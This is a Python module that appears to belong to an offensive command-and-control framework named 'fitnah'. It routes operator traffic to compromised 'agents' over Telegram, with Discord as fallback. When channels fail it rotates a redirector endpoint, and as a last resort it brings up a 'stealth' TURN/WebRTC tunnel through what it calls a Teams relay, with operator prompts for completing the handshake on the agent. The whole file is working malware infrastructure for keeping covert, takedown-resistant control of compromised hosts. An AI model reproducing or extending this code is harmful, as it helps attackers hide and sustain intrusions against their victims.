"""
Router — manages Telegram (primary) and Discord (fallback).

Failover logic:
  - Telegram is always tried first (priority=0)
  - After N consecutive Telegram send failures → switch active to Discord
  - Router keeps pinging Telegram in background to detect recovery
  - When Telegram recovers → switch back and notify operator

Fan-in:
  - Merges incoming message queues from all alive transports into one stream
  - C2Server reads from that single merged stream
"""
from __future__ import annotations

import asyncio
import logging
from typing import AsyncIterator, Callable

from fitnah.c2.transport.base import AbstractTransport
from fitnah.c2.redirector import C2Redirector

# Lazy import to avoid hard dependency when turnt assets are absent
def _get_turnt_transport_cls():
    try:
        from fitnah.c2.transport.turnt_transport import TurntTransport, TurntAwaitingAnswer
        return TurntTransport, TurntAwaitingAnswer
    except ImportError:
        return None, None

log = logging.getLogger(__name__)


class Router:
    def __init__(
        self,
        transports: list[AbstractTransport],
        failover_threshold: int = 3,
        on_failover: Callable[[str, str], None] | None = None,
    ):
        # sort so index-0 is always the highest-priority transport
        self._transports        = sorted(transports, key=lambda t: t.priority)
        self._failover_threshold = failover_threshold
        self._on_failover       = on_failover   # called with (from_name, to_name)

        self._active_idx        = 0             # which transport is currently primary
        self._fail_counts: dict[str, int] = {t.name: 0 for t in transports}
        self._recovery_task: asyncio.Task | None = None
        self._redirector        = C2Redirector()

    # ── startup / shutdown ────────────────────────────────────────────────
    async def connect_all(self) -> None:
        for t in self._transports:
            # turnt is manually activated by the operator via `tunnel start` — skip auto-connect
            if t.name == "turnt":
                log.info("[router] turnt transport registered (manual activation via 'tunnel start')")
                continue
            for attempt in range(1, 4):  # up to 3 attempts
                try:
                    await t.connect()
                    log.info("[router] %-10s connected", t.name)
                    break
                except Exception as exc:
                    log.warning(
                        "[router] %-10s connect attempt %d/3 failed: %s",
                        t.name, attempt, exc,
                    )
                    if attempt < 3:
                        await asyncio.sleep(3)
                    else:
                        log.error("[router] %-10s could not connect after 3 attempts", t.name)

    async def disconnect_all(self) -> None:
        if self._recovery_task:
            self._recovery_task.cancel()
        for t in self._transports:
            try:
                await t.disconnect()
            except Exception:
                pass

    # ── send with failover ────────────────────────────────────────────────
    async def send(self, chat_id: str, text: str) -> bool:
        """
        Send text. Tries transports in priority order.
        Increments fail counter on error and triggers failover when threshold hit.
        Returns True if sent successfully.
        """
        for idx, t in enumerate(self._transports):
            if not t.is_alive:
                continue
            try:
                await t.send(chat_id, text)
                self._on_success(t.name)
                return True
            except Exception as exc:
                log.warning(
                    "[router] %-10s send failed: %s", t.name, exc
                )
                await self._on_failure(t.name)

        log.error("[router] all transports failed — message to %s dropped", chat_id)
        return False

    async def send_file(
        self, chat_id: str, filename: str, data: bytes, caption: str = ""
    ) -> bool:
        for t in self._transports:
            if not t.is_alive:
                continue
            try:
                await t.send_file(chat_id, filename, data, caption)
                self._on_success(t.name)
                return True
            except Exception as exc:
                log.warning("[router] %-10s send_file failed: %s", t.name, exc)
                await self._on_failure(t.name)
        return False

    async def send_photo(
        self, chat_id: str, data: bytes, caption: str = ""
    ) -> bool:
        for t in self._transports:
            if not t.is_alive:
                continue
            try:
                await t.send_photo(chat_id, data, caption)
                self._on_success(t.name)
                return True
            except Exception as exc:
                log.warning("[router] %-10s send_photo failed: %s", t.name, exc)
                await self._on_failure(t.name)
        return False

    # ── operator-specific shortcuts ───────────────────────────────────────
    async def notify_operator(self, text: str, operator_chat_id: str) -> None:
        """Always send to operator regardless of active transport."""
        await self.send(operator_chat_id, text)

    # ── fan-in listener ───────────────────────────────────────────────────
    async def listen(self) -> AsyncIterator[dict]:
        """
        Merge incoming message streams from all alive transports.
        Dynamically picks up transports (e.g. turnt) that become alive after startup.
        Yields one dict per message with '_transport' key set.
        """
        merged: asyncio.Queue[dict] = asyncio.Queue()
        relay_tasks: dict[str, asyncio.Task] = {}

        async def _relay(transport: AbstractTransport) -> None:
            async for msg in transport.listen():
                msg["_transport"] = transport.name
                await merged.put(msg)

        async def _watcher() -> None:
            """Periodically check for newly alive transports and add them to fan-in."""
            while True:
                await asyncio.sleep(5)
                for t in self._transports:
                    if t.is_alive and t.name not in relay_tasks:
                        task = asyncio.create_task(_relay(t), name=f"relay-{t.name}")
                        relay_tasks[t.name] = task
                        log.info("[router] %s became alive — added to listen fan-in", t.name)

        # seed with currently alive transports
        for t in self._transports:
            if t.is_alive:
                task = asyncio.create_task(_relay(t), name=f"relay-{t.name}")
                relay_tasks[t.name] = task

        watcher = asyncio.create_task(_watcher(), name="transport-watcher")
        try:
            while True:
                yield await merged.get()
        finally:
            watcher.cancel()
            for task in relay_tasks.values():
                task.cancel()

    # ── failover logic ────────────────────────────────────────────────────
    def _on_success(self, transport_name: str) -> None:
        self._fail_counts[transport_name] = 0

    async def _on_failure(self, transport_name: str) -> None:
        self._fail_counts[transport_name] = (
            self._fail_counts.get(transport_name, 0) + 1
        )
        count = self._fail_counts[transport_name]

        if count >= self._failover_threshold:
            await self._trigger_failover(transport_name)

    async def _trigger_failover(self, failed_name: str) -> None:
        # rotate redirector layer so next egress uses a different endpoint
        new_endpoint = self._redirector.rotate_layer()
        log.warning("[router] redirector rotated to layer: %s", new_endpoint)

        # find next alive transport after the failed one
        for t in self._transports:
            if t.name != failed_name and t.is_alive:
                log.warning(
                    "[router] failover: %s → %s (after %d failures)",
                    failed_name, t.name,
                    self._failover_threshold,
                )
                if self._on_failover:
                    self._on_failover(failed_name, t.name)

                # start a recovery watcher for the failed transport
                if self._recovery_task is None or self._recovery_task.done():
                    self._recovery_task = asyncio.create_task(
                        self._watch_recovery(failed_name),
                        name=f"recovery-{failed_name}",
                    )
                return

        # Last resort: try to activate the turnt TURN-tunnel transport
        await self._try_activate_turnt(failed_name)

    async def _try_activate_turnt(self, failed_name: str) -> None:
        """
        Attempt to bring up the TurntTransport as a last-resort egress path.
        turnt.connect() raises TurntAwaitingAnswer with the SDP offer; the
        operator must call submit_turnt_answer() after receiving the answer
        from the agent via the turnt_relay plugin.
        """
        TurntTransport, TurntAwaitingAnswer = _get_turnt_transport_cls()
        if TurntTransport is None:
            log.error("[router] failover failed — no alive transports available")
            return

        turnt = self._get_transport("turnt")
        if turnt is None:
            log.error("[router] failover failed — turnt transport not registered")
            return

        log.warning("[router] all primary transports failed — attempting turnt TURN-tunnel")
        try:
            await turnt.connect()
        except Exception as exc:
            if TurntAwaitingAnswer and isinstance(exc, TurntAwaitingAnswer):
                offer = exc.offer
                log.warning(
                    "[router] turnt awaiting SDP answer — offer ready (%d chars)", len(offer)
                )
                log.warning(
                    "[router] Run on agent: turnt_relay action=start offer=%s", offer[:40] + "..."
                )
                log.warning(
                    "[router] Then call: tunnel start <answer>  in the fitnah console"
                )
                if self._on_failover:
                    self._on_failover(failed_name, "turnt-pending")
            else:
                log.error("[router] turnt connect failed: %s", exc)
                log.error("[router] failover failed — no alive transports available")

    def submit_turnt_answer(self, answer: str) -> bool:
        """
        Called by the console 'tunnel start <answer>' command after the operator
        receives the SDP answer from the agent. Completes the turnt WebRTC handshake.
        """
        turnt = self._get_transport("turnt")
        if turnt is None:
            log.error("[router] submit_turnt_answer: turnt transport not registered")
            return False
        try:
            turnt.submit_answer(answer)   # type: ignore[attr-defined]
            log.info("[router] turnt tunnel activated")
            self._fail_counts["turnt"] = 0
            if self._on_failover:
                self._on_failover("turnt-pending", "turnt")
            return True
        except Exception as exc:
            log.error("[router] submit_turnt_answer failed: %s", exc)
            return False

    @property
    def turnt_pending_offer(self) -> str:
        """Return the pending SDP offer if turnt is awaiting an answer, else ''."""
        turnt = self._get_transport("turnt")
        if turnt and hasattr(turnt, "pending_offer"):
            return turnt.pending_offer   # type: ignore[attr-defined]
        return ""

    # ── original dead-end log (now unreachable, kept as fallback) ────────────
    def _log_no_transports(self) -> None:
        log.error("[router] failover failed — no alive transports available")

    async def _watch_recovery(self, transport_name: str) -> None:
        """Periodically check if a failed transport has recovered."""
        t = self._get_transport(transport_name)
        if not t:
            return

        log.info("[router] watching for %s recovery...", transport_name)
        while True:
            await asyncio.sleep(30)
            if t.is_alive:
                log.info("[router] %s recovered — switching back", transport_name)
                self._fail_counts[transport_name] = 0
                if self._on_failover:
                    # notify that we're switching back to primary
                    primary = self._transports[0]
                    if t.name == primary.name:
                        self._on_failover("fallback", t.name)
                return

    def _get_transport(self, name: str) -> AbstractTransport | None:
        return next((t for t in self._transports if t.name == name), None)

    # ── manual control ────────────────────────────────────────────────────
    async def force_failover(self, to_name: str) -> bool:
        """Operator-initiated transport switch."""
        t = self._get_transport(to_name)
        if not t or not t.is_alive:
            return False
        log.info("[router] manual failover to %s", to_name)
        if self._on_failover:
            current = self.active_transport
            self._on_failover(current, to_name)
        return True

    async def force_recover(self) -> bool:
        """Force switch back to primary transport."""
        primary = self._transports[0]
        if not primary.is_alive:
            return False
        self._fail_counts[primary.name] = 0
        log.info("[router] manual recover to %s", primary.name)
        return True

    # ── status ────────────────────────────────────────────────────────────
    @property
    def active_transport(self) -> str:
        for t in self._transports:
            if t.is_alive:
                return t.name
        return "none"

    def status_table(self) -> str:
        lines = ["\n  Transport Status"]
        lines.append("  " + "─" * 40)
        lines.append(f"  Redirector endpoint: {self._redirector.get_active_endpoint()}")
        lines.append("  " + "─" * 40)
        for t in self._transports:
            if t.name == "turnt":
                role = "stealth"
            elif t.priority == 0:
                role = "primary"
            else:
                role = "fallback"
            state  = "ALIVE  " if t.is_alive else "DEAD   "
            fails  = self._fail_counts.get(t.name, 0)
            active = " ◄ active" if t.name == self.active_transport else ""
            extra  = " (TURN tunnel — Teams relay)" if t.name == "turnt" else ""
            lines.append(
                f"  {t.name:<12} {role:<10} {state}  "
                f"failures={fails}{active}{extra}"
            )
        return "\n".join(lines)
